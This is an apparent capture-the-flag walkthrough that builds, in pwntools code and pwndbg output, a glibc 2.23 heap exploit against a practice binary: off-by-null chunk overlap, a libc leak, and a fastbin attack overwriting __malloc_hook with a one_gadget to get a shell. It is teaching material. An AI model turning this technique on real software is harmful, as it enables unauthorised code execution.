## 4.1.4 off by null
write basic framework
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.log_level = 'debug'
context.binary = './pwn'
elf = context.binary
libc = elf.libc
p = process('./pwn')

def show():
    p.sendlineafter('choice:', '1')

def add(length, name):
    p.sendlineafter('choice:', '2')
    p.sendlineafter(':', str(length))
    p.sendafter(':', name)
    sleep(0.01)

def edit(idx, length, name):
    p.sendlineafter('choice:', '3')
    p.sendlineafter(':', str(idx))
    p.sendlineafter(':', str(length))
    p.sendafter(':', name)
    sleep(0.01)

def delete(idx):
    p.sendlineafter('choice:', '4')
    p.sendlineafter(':', str(idx))

p.interactive()
```
add 4 chunks, modify the 2nd one to overwrite, also the correct prev_size
```python
add(0xf0, '0' * 0xf0)
add(0x68, '1' * 0x68)
add(0xf0, '2' * 0xf0)
add(0x10, '3' * 0x10)

pause()
edit(1, 0x68, flat('1' * 0x60, 0x170))
```
```
gdb -q -p `pidof pwn` -ex "b *0x400c05" -ex "c"
```
```
pwndbg> heapbase
heapbase : 0x228a000
pwndbg> x/90gx 0x228a000
0x228a000:	0x0000000000000000	0x0000000000000021
0x228a010:	0x0000000000400896	0x00000000004008b1
0x228a020:	0x0000000000000000	0x0000000000000101
0x228a030:	0x3030303030303030	0x3030303030303030
0x228a040:	0x3030303030303030	0x3030303030303030
0x228a050:	0x3030303030303030	0x3030303030303030
0x228a060:	0x3030303030303030	0x3030303030303030
0x228a070:	0x3030303030303030	0x3030303030303030
0x228a080:	0x3030303030303030	0x3030303030303030
0x228a090:	0x3030303030303030	0x3030303030303030
0x228a0a0:	0x3030303030303030	0x3030303030303030
0x228a0b0:	0x3030303030303030	0x3030303030303030
0x228a0c0:	0x3030303030303030	0x3030303030303030
0x228a0d0:	0x3030303030303030	0x3030303030303030
0x228a0e0:	0x3030303030303030	0x3030303030303030
0x228a0f0:	0x3030303030303030	0x3030303030303030
0x228a100:	0x3030303030303030	0x3030303030303030
0x228a110:	0x3030303030303030	0x3030303030303030
0x228a120:	0x0000000000000000	0x0000000000000071
0x228a130:	0x3131313131313131	0x3131313131313131
0x228a140:	0x3131313131313131	0x3131313131313131
0x228a150:	0x3131313131313131	0x3131313131313131
0x228a160:	0x3131313131313131	0x3131313131313131
0x228a170:	0x3131313131313131	0x3131313131313131
0x228a180:	0x3131313131313131	0x3131313131313131
0x228a190:	0x3131313131313131	0x0000000000000101
0x228a1a0:	0x3232323232323232	0x3232323232323232
0x228a1b0:	0x3232323232323232	0x3232323232323232
0x228a1c0:	0x3232323232323232	0x3232323232323232
0x228a1d0:	0x3232323232323232	0x3232323232323232
0x228a1e0:	0x3232323232323232	0x3232323232323232
0x228a1f0:	0x3232323232323232	0x3232323232323232
0x228a200:	0x3232323232323232	0x3232323232323232
0x228a210:	0x3232323232323232	0x3232323232323232
0x228a220:	0x3232323232323232	0x3232323232323232
0x228a230:	0x3232323232323232	0x3232323232323232
0x228a240:	0x3232323232323232	0x3232323232323232
0x228a250:	0x3232323232323232	0x3232323232323232
0x228a260:	0x3232323232323232	0x3232323232323232
0x228a270:	0x3232323232323232	0x3232323232323232
0x228a280:	0x3232323232323232	0x3232323232323232
0x228a290:	0x0000000000000000	0x0000000000000021
0x228a2a0:	0x3333333333333333	0x3333333333333333
0x228a2b0:	0x0000000000000000	0x0000000000020ce1
0x228a2c0:	0x0000000000000000	0x0000000000000000
```
ni again and again
```
   0x400c27 <change_item+260>    mov    byte ptr [rax], 0
 ► 0x400c2a <change_item+263>    jmp    change_item+275 <change_item+275>
```
101 changed to 100(p set to 0), prev size 0x170
```
pwndbg> x/90gx 0x228a000
0x228a000:	0x0000000000000000	0x0000000000000021
0x228a010:	0x0000000000400896	0x00000000004008b1
0x228a020:	0x0000000000000000	0x0000000000000101
0x228a030:	0x3030303030303030	0x3030303030303030
0x228a040:	0x3030303030303030	0x3030303030303030
0x228a050:	0x3030303030303030	0x3030303030303030
0x228a060:	0x3030303030303030	0x3030303030303030
0x228a070:	0x3030303030303030	0x3030303030303030
0x228a080:	0x3030303030303030	0x3030303030303030
0x228a090:	0x3030303030303030	0x3030303030303030
0x228a0a0:	0x3030303030303030	0x3030303030303030
0x228a0b0:	0x3030303030303030	0x3030303030303030
0x228a0c0:	0x3030303030303030	0x3030303030303030
0x228a0d0:	0x3030303030303030	0x3030303030303030
0x228a0e0:	0x3030303030303030	0x3030303030303030
0x228a0f0:	0x3030303030303030	0x3030303030303030
0x228a100:	0x3030303030303030	0x3030303030303030
0x228a110:	0x3030303030303030	0x3030303030303030
0x228a120:	0x0000000000000000	0x0000000000000071
0x228a130:	0x3131313131313131	0x3131313131313131
0x228a140:	0x3131313131313131	0x3131313131313131
0x228a150:	0x3131313131313131	0x3131313131313131
0x228a160:	0x3131313131313131	0x3131313131313131
0x228a170:	0x3131313131313131	0x3131313131313131
0x228a180:	0x3131313131313131	0x3131313131313131
0x228a190:	0x0000000000000170	0x0000000000000100
0x228a1a0:	0x3232323232323232	0x3232323232323232
0x228a1b0:	0x3232323232323232	0x3232323232323232
0x228a1c0:	0x3232323232323232	0x3232323232323232
0x228a1d0:	0x3232323232323232	0x3232323232323232
0x228a1e0:	0x3232323232323232	0x3232323232323232
0x228a1f0:	0x3232323232323232	0x3232323232323232
0x228a200:	0x3232323232323232	0x3232323232323232
0x228a210:	0x3232323232323232	0x3232323232323232
0x228a220:	0x3232323232323232	0x3232323232323232
0x228a230:	0x3232323232323232	0x3232323232323232
0x228a240:	0x3232323232323232	0x3232323232323232
0x228a250:	0x3232323232323232	0x3232323232323232
0x228a260:	0x3232323232323232	0x3232323232323232
0x228a270:	0x3232323232323232	0x3232323232323232
0x228a280:	0x3232323232323232	0x3232323232323232
0x228a290:	0x0000000000000000	0x0000000000000021
0x228a2a0:	0x3333333333333333	0x3333333333333333
0x228a2b0:	0x0000000000000000	0x0000000000020ce1
0x228a2c0:	0x0000000000000000	0x0000000000000000
```
delete 0, 2, will merge to a large chunk
```python
add(0xf0, '0' * 0xf0)
add(0x68, '1' * 0x68)
add(0xf0, '2' * 0xf0)
add(0x10, '3' * 0x10)

delete(0)
edit(1, 0x68, flat('1' * 0x60, 0x170))
pause()
delete(2)
```
```gdb -q -p `pidof pwn` -ex "b *0x400CDD" -ex "c"```, look fd bk
```
pwndbg> x/90gx 0x14c1000
0x14c1000:	0x0000000000000000	0x0000000000000021
0x14c1010:	0x0000000000400896	0x00000000004008b1
0x14c1020:	0x0000000000000000	0x0000000000000271
0x14c1030:	0x00007f50555b2b78	0x00007f50555b2b78
0x14c1040:	0x3030303030303030	0x3030303030303030
0x14c1050:	0x3030303030303030	0x3030303030303030
0x14c1060:	0x3030303030303030	0x3030303030303030
0x14c1070:	0x3030303030303030	0x3030303030303030
0x14c1080:	0x3030303030303030	0x3030303030303030
0x14c1090:	0x3030303030303030	0x3030303030303030
0x14c10a0:	0x3030303030303030	0x3030303030303030
0x14c10b0:	0x3030303030303030	0x3030303030303030
0x14c10c0:	0x3030303030303030	0x3030303030303030
0x14c10d0:	0x3030303030303030	0x3030303030303030
0x14c10e0:	0x3030303030303030	0x3030303030303030
0x14c10f0:	0x3030303030303030	0x3030303030303030
0x14c1100:	0x3030303030303030	0x3030303030303030
0x14c1110:	0x3030303030303030	0x3030303030303030
0x14c1120:	0x0000000000000100	0x0000000000000070
0x14c1130:	0x3131313131313131	0x3131313131313131
0x14c1140:	0x3131313131313131	0x3131313131313131
0x14c1150:	0x3131313131313131	0x3131313131313131
0x14c1160:	0x3131313131313131	0x3131313131313131
0x14c1170:	0x3131313131313131	0x3131313131313131
0x14c1180:	0x3131313131313131	0x3131313131313131
0x14c1190:	0x0000000000000170	0x0000000000000100
0x14c11a0:	0x3232323232323232	0x3232323232323232
0x14c11b0:	0x3232323232323232	0x3232323232323232
0x14c11c0:	0x3232323232323232	0x3232323232323232
0x14c11d0:	0x3232323232323232	0x3232323232323232
0x14c11e0:	0x3232323232323232	0x3232323232323232
0x14c11f0:	0x3232323232323232	0x3232323232323232
0x14c1200:	0x3232323232323232	0x3232323232323232
0x14c1210:	0x3232323232323232	0x3232323232323232
0x14c1220:	0x3232323232323232	0x3232323232323232
0x14c1230:	0x3232323232323232	0x3232323232323232
0x14c1240:	0x3232323232323232	0x3232323232323232
0x14c1250:	0x3232323232323232	0x3232323232323232
0x14c1260:	0x3232323232323232	0x3232323232323232
0x14c1270:	0x3232323232323232	0x3232323232323232
0x14c1280:	0x3232323232323232	0x3232323232323232
0x14c1290:	0x0000000000000270	0x0000000000000020
0x14c12a0:	0x3333333333333333	0x3333333333333333
0x14c12b0:	0x0000000000000000	0x0000000000020ce1
0x14c12c0:	0x0000000000000000	0x0000000000000000
```
add new chunk, to make fd the positon 0x14c1130 above
```python
add(0xf0, '0' * 0xf0)
add(0x68, '1' * 0x68)
add(0xf0, '2' * 0xf0)
add(0x10, '3' * 0x10)

delete(0)
edit(1, 0x68, flat('1' * 0x60, 0x170))
delete(2)
pause()
add(0xf0, 'x' * 0x10)

p.interactive()
```
```gdb -q -p `pidof pwn` -ex "b *0x400A6F" -ex "c"```
```
pwndbg> heapbase
heapbase : 0x6c3000
pwndbg> ni
pwndbg> x/90gx 0x6c3000
0x6c3000:	0x0000000000000000	0x0000000000000021
0x6c3010:	0x0000000000400896	0x00000000004008b1
0x6c3020:	0x0000000000000000	0x0000000000000101
0x6c3030:	0x00007fed0c14bdd8	0x00007fed0c14bdd8
0x6c3040:	0x3030303030303030	0x3030303030303030
0x6c3050:	0x3030303030303030	0x3030303030303030
0x6c3060:	0x3030303030303030	0x3030303030303030
0x6c3070:	0x3030303030303030	0x3030303030303030
0x6c3080:	0x3030303030303030	0x3030303030303030
0x6c3090:	0x3030303030303030	0x3030303030303030
0x6c30a0:	0x3030303030303030	0x3030303030303030
0x6c30b0:	0x3030303030303030	0x3030303030303030
0x6c30c0:	0x3030303030303030	0x3030303030303030
0x6c30d0:	0x3030303030303030	0x3030303030303030
0x6c30e0:	0x3030303030303030	0x3030303030303030
0x6c30f0:	0x3030303030303030	0x3030303030303030
0x6c3100:	0x3030303030303030	0x3030303030303030
0x6c3110:	0x3030303030303030	0x3030303030303030
0x6c3120:	0x0000000000000100	0x0000000000000171
0x6c3130:	0x00007fed0c14bb78	0x00007fed0c14bb78
0x6c3140:	0x3131313131313131	0x3131313131313131
0x6c3150:	0x3131313131313131	0x3131313131313131
0x6c3160:	0x3131313131313131	0x3131313131313131
0x6c3170:	0x3131313131313131	0x3131313131313131
0x6c3180:	0x3131313131313131	0x3131313131313131
0x6c3190:	0x0000000000000170	0x0000000000000100
0x6c31a0:	0x3232323232323232	0x3232323232323232
0x6c31b0:	0x3232323232323232	0x3232323232323232
0x6c31c0:	0x3232323232323232	0x3232323232323232
0x6c31d0:	0x3232323232323232	0x3232323232323232
0x6c31e0:	0x3232323232323232	0x3232323232323232
0x6c31f0:	0x3232323232323232	0x3232323232323232
0x6c3200:	0x3232323232323232	0x3232323232323232
0x6c3210:	0x3232323232323232	0x3232323232323232
0x6c3220:	0x3232323232323232	0x3232323232323232
0x6c3230:	0x3232323232323232	0x3232323232323232
0x6c3240:	0x3232323232323232	0x3232323232323232
0x6c3250:	0x3232323232323232	0x3232323232323232
0x6c3260:	0x3232323232323232	0x3232323232323232
0x6c3270:	0x3232323232323232	0x3232323232323232
0x6c3280:	0x3232323232323232	0x3232323232323232
0x6c3290:	0x0000000000000170	0x0000000000000020
0x6c32a0:	0x3333333333333333	0x3333333333333333
0x6c32b0:	0x0000000000000000	0x0000000000020ce1
0x6c32c0:	0x0000000000000000	0x0000000000000000
pwndbg> xinfo 0x00007fed0c14bb78
Extended information for virtual address 0x7fed0c14bb78:

  Containing mapping:
    0x7fed0c14b000     0x7fed0c14d000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so

  Offset information:
         Mapped Area 0x7fed0c14bb78 = 0x7fed0c14b000 + 0xb78
         File (Base) 0x7fed0c14bb78 = 0x7fed0bd87000 + 0x3c4b78
      File (Segment) 0x7fed0c14bb78 = 0x7fed0c1477c0 + 0x43b8
         File (Disk) 0x7fed0c14bb78 = /lib/x86_64-linux-gnu/libc-2.23.so + 0x1c4b78

 Containing ELF sections:
               .data 0x7fed0c14bb78 = 0x7fed0c14b080 + 0xaf8
```
since it is overlapped, we can show to leak libc address
```python
add(0xf0, '0' * 0xf0)
add(0x68, '1' * 0x68)
add(0xf0, '2' * 0xf0)
add(0x10, '3' * 0x10)

delete(0)
edit(1, 0x68, flat('1' * 0x60, 0x170))
delete(2)
add(0xf0, 'x' * 0x10)
pause()
show()
```
```gdb -q -p `pidof pwn` -ex "b *0x40099B" -ex "c"```
ni again and again get
```
[*] Switching to interactive mode
[DEBUG] Received 0x14 bytes:
    b'0 : xxxxxxxxxxxxxxxx'
0 : xxxxxxxxxxxxxxxx[DEBUG] Received 0xa bytes:
    00000000  31 20 3a 20  78 0b ef fb  c7 7f                     │1 : │x···│··│
    0000000a
1 : x\x0b\xfb\xc7$  
```
write code to recv it
```python
add(0xf0, '0' * 0xf0)
add(0x68, '1' * 0x68)
add(0xf0, '2' * 0xf0)
add(0x10, '3' * 0x10)

delete(0)
edit(1, 0x68, flat('1' * 0x60, 0x170))
delete(2)
add(0xf0, 'x' * 0x10)
show()
libc.address = u64(p.recvuntil("\x7f")[-6:] + b'\0\0') - 0x3c4b78
print('libc @ {:#x}'.format(libc.address))
assert libc.address & 0xfff == 0
```
pause before show again, see the chunk to recover it
```python
pause()
show()
```
```gdb -q -p `pidof pwn` -ex "b *0x40099B" -ex "c"```
```
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x1974120 ◂— 0x171
BK: 0x1974120 —▸ 0x7fd7c6ea0b78 (main_arena+88) ◂— 0x1974120
smallbins
empty
largebins
empty
pwndbg> x/4gx 0x1974120
0x1974120:	0x0000000000000100	0x0000000000000171
0x1974130:	0x00007fd7c6ea0b78	0x00007fd7c6ea0b78
```
recover
```python
add(0x160, '4' * 0x160)
```
then repeat the above, to confirm the index is 4
```python
add(0xf0, 'a' * 0xf0)
add(0x68, 'b' * 0x68)
add(0xf0, 'c' * 0xf0)
add(0x10, 'd' * 0x10)

pause()
delete(0)
```
```gdb -q -p `pidof pwn```
```
pwndbg> telescope 0x6020C0 20
00:0000│   0x6020c0 (itemlist) ◂— 0xf0
01:0008│   0x6020c8 (itemlist+8) —▸ 0x191c030 ◂— 'xxxxxxxxxxxxxxxx'
02:0010│   0x6020d0 (itemlist+16) ◂— 0x68 /* 'h' */
03:0018│   0x6020d8 (itemlist+24) —▸ 0x191c130 ◂— 0x3434343434343434 ('44444444')
04:0020│   0x6020e0 (itemlist+32) ◂— 0x160
05:0028│   0x6020e8 (itemlist+40) —▸ 0x191c130 ◂— 0x3434343434343434 ('44444444')
06:0030│   0x6020f0 (itemlist+48) ◂— 0x10
07:0038│   0x6020f8 (itemlist+56) —▸ 0x191c2a0 ◂— '3333333333333333'
08:0040│   0x602100 (itemlist+64) ◂— 0xf0
09:0048│   0x602108 (itemlist+72) —▸ 0x191c2c0 ◂— 0x6161616161616161 ('aaaaaaaa')
0a:0050│   0x602110 (itemlist+80) ◂— 0x68 /* 'h' */
0b:0058│   0x602118 (itemlist+88) —▸ 0x191c3c0 ◂— 0x6262626262626262 ('bbbbbbbb')
0c:0060│   0x602120 (itemlist+96) ◂— 0xf0
0d:0068│   0x602128 (itemlist+104) —▸ 0x191c430 ◂— 0x6363636363636363 ('cccccccc')
0e:0070│   0x602130 (itemlist+112) ◂— 0x10
0f:0078│   0x602138 (itemlist+120) —▸ 0x191c530 ◂— 'dddddddddddddddd'
10:0080│   0x602140 (itemlist+128) ◂— 0x0
... ↓
```
then similar to above, but this time also del the 2nd chunk before then the fd make sense
```python
add(0xf0, 'a' * 0xf0)
add(0x68, 'b' * 0x68)
add(0xf0, 'c' * 0xf0)
add(0x10, 'd' * 0x10)

delete(4)
edit(5, 0x68, flat('1' * 0x60, 0x170))
delete(6)
delete(5)
pause()
add(0x120, flat(cyclic(n = 8, length = 0x120)))
```
```gdb -q -p `pidof pwn` -ex "b *0x400AB8" -ex "c"```
0x183f3c0 is the position we need
```
 ► 0x400ab8 <add_item+257>    call   read@plt <read@plt>
        fd: 0x0
        buf: 0x183f2c0 —▸ 0x7f8ff4af8dd8 (main_arena+696) —▸ 0x7f8ff4af8dc8 (main_arena+680) —▸ 0x7f8ff4af8db8 (main_arena+664) —▸ 0x7f8ff4af8da8 (main_arena+648) ◂— ...
        nbytes: 0x120
pwndbg> x/90gx 0x183f2c0-0x10
0x183f2b0:	0x0000000000000000	0x0000000000000131
0x183f2c0:	0x00007f8ff4af8dd8	0x00007f8ff4af8dd8
0x183f2d0:	0x6161616161616161	0x6161616161616161
0x183f2e0:	0x6161616161616161	0x6161616161616161
0x183f2f0:	0x6161616161616161	0x6161616161616161
0x183f300:	0x6161616161616161	0x6161616161616161
0x183f310:	0x6161616161616161	0x6161616161616161
0x183f320:	0x6161616161616161	0x6161616161616161
0x183f330:	0x6161616161616161	0x6161616161616161
0x183f340:	0x6161616161616161	0x6161616161616161
0x183f350:	0x6161616161616161	0x6161616161616161
0x183f360:	0x6161616161616161	0x6161616161616161
0x183f370:	0x6161616161616161	0x6161616161616161
0x183f380:	0x6161616161616161	0x6161616161616161
0x183f390:	0x6161616161616161	0x6161616161616161
0x183f3a0:	0x6161616161616161	0x6161616161616161
0x183f3b0:	0x0000000000000100	0x0000000000000070
0x183f3c0:	0x0000000000000000	0x3131313131313131
0x183f3d0:	0x3131313131313131	0x3131313131313131
0x183f3e0:	0x3131313131313131	0x0000000000000141
0x183f3f0:	0x00007f8ff4af8b78	0x00007f8ff4af8b78
0x183f400:	0x3131313131313131	0x3131313131313131
0x183f410:	0x3131313131313131	0x3131313131313131
0x183f420:	0x0000000000000170	0x0000000000000100
0x183f430:	0x6363636363636363	0x6363636363636363
0x183f440:	0x6363636363636363	0x6363636363636363
0x183f450:	0x6363636363636363	0x6363636363636363
0x183f460:	0x6363636363636363	0x6363636363636363
0x183f470:	0x6363636363636363	0x6363636363636363
0x183f480:	0x6363636363636363	0x6363636363636363
0x183f490:	0x6363636363636363	0x6363636363636363
0x183f4a0:	0x6363636363636363	0x6363636363636363
0x183f4b0:	0x6363636363636363	0x6363636363636363
0x183f4c0:	0x6363636363636363	0x6363636363636363
0x183f4d0:	0x6363636363636363	0x6363636363636363
0x183f4e0:	0x6363636363636363	0x6363636363636363
0x183f4f0:	0x6363636363636363	0x6363636363636363
0x183f500:	0x6363636363636363	0x6363636363636363
0x183f510:	0x6363636363636363	0x6363636363636363
0x183f520:	0x0000000000000140	0x0000000000000020
0x183f530:	0x6464646464646464	0x6464646464646464
0x183f540:	0x0000000000000000	0x00000000000209e1
0x183f550:	0x0000000000000000	0x0000000000000000
0x183f560:	0x0000000000000000	0x0000000000000000
0x183f570:	0x0000000000000000	0x0000000000000000
pwndbg> ni
pwndbg> x/90gx 0x183f2c0-0x10
0x183f2b0:	0x0000000000000000	0x0000000000000131
0x183f2c0:	0x6161616161616161	0x6161616161616162
0x183f2d0:	0x6161616161616163	0x6161616161616164
0x183f2e0:	0x6161616161616165	0x6161616161616166
0x183f2f0:	0x6161616161616167	0x6161616161616168
0x183f300:	0x6161616161616169	0x616161616161616a
0x183f310:	0x616161616161616b	0x616161616161616c
0x183f320:	0x616161616161616d	0x616161616161616e
0x183f330:	0x616161616161616f	0x6161616161616170
0x183f340:	0x6161616161616171	0x6161616161616172
0x183f350:	0x6161616161616173	0x6161616161616174
0x183f360:	0x6161616161616175	0x6161616161616176
0x183f370:	0x6161616161616177	0x6161616161616178
0x183f380:	0x6161616161616179	0x626161616161617a
0x183f390:	0x6261616161616162	0x6261616161616163
0x183f3a0:	0x6261616161616164	0x6261616161616165
0x183f3b0:	0x6261616161616166	0x6261616161616167
0x183f3c0:	0x6261616161616168	0x6261616161616169
0x183f3d0:	0x626161616161616a	0x626161616161616b
0x183f3e0:	0x3131313131313131	0x0000000000000141
0x183f3f0:	0x00007f8ff4af8b78	0x00007f8ff4af8b78
0x183f400:	0x3131313131313131	0x3131313131313131
0x183f410:	0x3131313131313131	0x3131313131313131
0x183f420:	0x0000000000000170	0x0000000000000100
0x183f430:	0x6363636363636363	0x6363636363636363
0x183f440:	0x6363636363636363	0x6363636363636363
0x183f450:	0x6363636363636363	0x6363636363636363
0x183f460:	0x6363636363636363	0x6363636363636363
0x183f470:	0x6363636363636363	0x6363636363636363
0x183f480:	0x6363636363636363	0x6363636363636363
0x183f490:	0x6363636363636363	0x6363636363636363
0x183f4a0:	0x6363636363636363	0x6363636363636363
0x183f4b0:	0x6363636363636363	0x6363636363636363
0x183f4c0:	0x6363636363636363	0x6363636363636363
0x183f4d0:	0x6363636363636363	0x6363636363636363
0x183f4e0:	0x6363636363636363	0x6363636363636363
0x183f4f0:	0x6363636363636363	0x6363636363636363
0x183f500:	0x6363636363636363	0x6363636363636363
0x183f510:	0x6363636363636363	0x6363636363636363
0x183f520:	0x0000000000000140	0x0000000000000020
0x183f530:	0x6464646464646464	0x6464646464646464
0x183f540:	0x0000000000000000	0x00000000000209e1
0x183f550:	0x0000000000000000	0x0000000000000000
0x183f560:	0x0000000000000000	0x0000000000000000
0x183f570:	0x0000000000000000	0x0000000000000000
pwndbg> cyclic -n 8 -l haaaaaab
256
```
test it, also set the correct prev size
```python
delete(4)
edit(5, 0x68, flat('1' * 0x60, 0x170))
delete(6)
delete(5)
#add(0x120, flat(cyclic(n = 8, length = 0x120)))
pause()
add(0x120, flat('a' * 248, 0x71, 0xdeedbeef))
```
```gdb -q -p `pidof pwn` -ex "b *0x400AB8" -ex "c"```
```
pwndbg> ni
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x1a743b0 ◂— 0xdeedbeef
0x80: 0x0
pwndbg> magic
========== function ==========
system:0x453a0
execve:0xcc7f0
open:0xf70f0
read:0xf7310
write:0xf7370
gets:0x6ed90
setcontext+0x35:0x47b85
========== variables ==========
__malloc_hook(0x3c4b10)             : 0x0000000000000000
__free_hook(0x3c67a8)               : 0x0000000000000000
__realloc_hook(0x3c4b08)            : 0x00007fdc97442a70
stdin(-0x7fdc96dbaf50)              : 0x00007fdc977818e0
stdout(-0x7fdc96dbaf60)             : 0x00007fdc97782620
_IO_list_all(0x3c5520)              : 0x00007fdc97782540
__after_morecore_hook(0x3c67a0)     : 0x0000000000000000
pwndbg> p &__malloc_hook
$1 = (void *(**)(size_t, const void *)) 0x7fdc97781b10 <__malloc_hook>
pwndbg> x/20gx 0x7fdc97781b10-0x20
0x7fdc97781af0 <_IO_wide_data_0+304>:	0x00007fdc97780260	0x0000000000000000
0x7fdc97781b00 <__memalign_hook>:	0x00007fdc97442ea0	0x00007fdc97442a70
0x7fdc97781b10 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
0x7fdc97781b20 <main_arena>:	0x0000000000000000	0x0000000000000000
0x7fdc97781b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7fdc97781b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7fdc97781b50 <main_arena+48>:	0x000000000089c3b0	0x0000000000000000
0x7fdc97781b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7fdc97781b70 <main_arena+80>:	0x0000000000000000	0x000000000089c540
0x7fdc97781b80 <main_arena+96>:	0x000000000089c3e0	0x000000000089c3e0
pwndbg> x/4gx 0x7fdc97781b10-0x23
0x7fdc97781aed <_IO_wide_data_0+301>:	0xdc97780260000000	0x000000000000007f
0x7fdc97781afd:	0xdc97442ea0000000	0xdc97442a7000007f
```
then malloc twice, we can do fastbin attack to malloc_hook-0x23, one_garget offset 0x13
```
root@vm:~/ctf/1# one_gadget /lib/x86_64-linux-gnu/libc.so.6
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0364 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1207 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

```python
libc.sym['one_gadget'] = 0x4527a

delete(4)
edit(5, 0x68, flat('1' * 0x60, 0x170))
delete(6)
delete(5)
#add(0x120, flat(cyclic(n = 8, length = 0x120)))
add(0x120, flat('a' * 248, 0x71, libc.sym['__malloc_hook'] - 0x23))
add(0x68, 'x' * 10)
pause()
add(0x68, flat('\0' * 0x13, libc.sym['one_gadget']))
```
```gdb -q -p `pidof pwn` -ex "b *0x400A6F" -ex "c"```
fastbins c ctrl+C magic malloc_hook is changed
```
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x7f1dc0b1caed (_IO_wide_data_0+301) ◂— 0x1dc07dda7000007f
0x80: 0x0
pwndbg> c
Continuing.
^C
========== function ==========
system:0x453a0
execve:0xcc7f0
open:0xf70f0
read:0xf7310
write:0xf7370
gets:0x6ed90
setcontext+0x35:0x47b85
========== variables ==========
__malloc_hook(0x3c4b10)             : 0x00007f1dc079d27a
__free_hook(0x3c67a8)               : 0x0000000000000000
__realloc_hook(0x3c4b08)            : 0x0000000000000000
stdin(-0x7f1dc0155f50)              : 0x00007f1dc0b1c8e0
stdout(-0x7f1dc0155f60)             : 0x00007f1dc0b1d620
_IO_list_all(0x3c5520)              : 0x00007f1dc0b1d540
__after_morecore_hook(0x3c67a0)     : 0x0000000000000000

```
to trigger malloc
```python
delete(4)
edit(5, 0x68, flat('1' * 0x60, 0x170))
delete(6)
delete(5)
#add(0x120, flat(cyclic(n = 8, length = 0x120)))
add(0x120, flat('a' * 248, 0x71, libc.sym['__malloc_hook'] - 0x23))
add(0x68, 'x' * 10)
add(0x68, flat('\0' * 0x13, libc.sym['one_gadget']))
pause()
p.sendlineafter('choice:', '2')
p.sendlineafter(':', str(0xff))
```
```gdb -q -p `pidof pwn````
```
pwndbg> magic
========== function ==========
system:0x453a0
execve:0xcc7f0
open:0xf70f0
read:0xf7310
write:0xf7370
gets:0x6ed90
setcontext+0x35:0x47b85
========== variables ==========
__malloc_hook(0x3c4b10)             : 0x00007f055712027a
__free_hook(0x3c67a8)               : 0x0000000000000000
__realloc_hook(0x3c4b08)            : 0x0000000000000000
stdin(-0x7f0556ad8f50)              : 0x00007f055749f8e0
stdout(-0x7f0556ad8f60)             : 0x00007f05574a0620
_IO_list_all(0x3c5520)              : 0x00007f05574a0540
__after_morecore_hook(0x3c67a0)     : 0x0000000000000000
pwndbg> b *0x00007f055712027a
Breakpoint 1 at 0x7f055712027a: file ../sysdeps/posix/system.c, line 136.
pwndbg> c
Continuing.

Breakpoint 1, do_system (line=0x0) at ../sysdeps/posix/system.c:136
136	../sysdeps/posix/system.c: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────[ REGISTERS ]────────────────────────────────────────
*RAX  0x7f055712027a (do_system+1098) ◂— mov    rax, qword ptr [rip + 0x37ec37]
 RBX  0x0
*RCX  0xffffffda

pwndbg> stack 20
00:0000│ rsp  0x7ffc0e579db8 —▸ 0x400a74 (add_item+189) ◂— mov    rdx, rax
01:0008│      0x7ffc0e579dc0 ◂— 0x80e579ef0
02:0010│      0x7ffc0e579dc8 ◂— 0xff
03:0018│      0x7ffc0e579dd0 ◂— 0xa353532 /* '255\n' */
04:0020│      0x7ffc0e579dd8 ◂— 0x411c9b54d0335b00
05:0028│ rbp  0x7ffc0e579de0 —▸ 0x7ffc0e579e10 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r15
06:0030│      0x7ffc0e579de8 —▸ 0x400e95 (main+222) ◂— jmp    0x400ed3
07:0038│      0x7ffc0e579df0 ◂— 0x200400ee0
08:0040│      0x7ffc0e579df8 —▸ 0x1883010 —▸ 0x400896 (hello_message) ◂— push   rbp
09:0048│      0x7ffc0e579e00 —▸ 0x7ffc0e570a32 ◂— 0x0
0a:0050│      0x7ffc0e579e08 ◂— 0x411c9b54d0335b00
0b:0058│      0x7ffc0e579e10 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r15
0c:0060│      0x7ffc0e579e18 —▸ 0x7f05570fb840 (__libc_start_main+240) ◂— mov    edi, eax
0d:0068│      0x7ffc0e579e20 ◂— 0x0
0e:0070│      0x7ffc0e579e28 —▸ 0x7ffc0e579ef8 —▸ 0x7ffc0e57c259 ◂— 0x4c43006e77702f2e /* './pwn' */
0f:0078│      0x7ffc0e579e30 ◂— 0x100000000
10:0080│      0x7ffc0e579e38 —▸ 0x400db7 (main) ◂— push   rbp
11:0088│      0x7ffc0e579e40 ◂— 0x0
12:0090│      0x7ffc0e579e48 ◂— 0xc02e630d3a52b380
13:0098│      0x7ffc0e579e50 —▸ 0x4007a0 (_start) ◂— xor    ebp, ebp

```
rax 30 50 70 not null, one_gadget not ok, need to use realloc
```
pwndbg> p &__malloc_hook
$1 = (void *(**)(size_t, const void *)) 0x7f23cef89b10 <__malloc_hook>
pwndbg> telescope 0x7f23cef89b10-0x20
00:0000│   0x7f23cef89af0 (_IO_wide_data_0+304) —▸ 0x7f23cef88260 (_IO_wfile_jumps) ◂— 0x0
01:0008│   0x7f23cef89af8 ◂— 0x0
02:0010│   0x7f23cef89b00 (__memalign_hook) —▸ 0x7f23cec4aea0 (memalign_hook_ini) ◂— push   r12
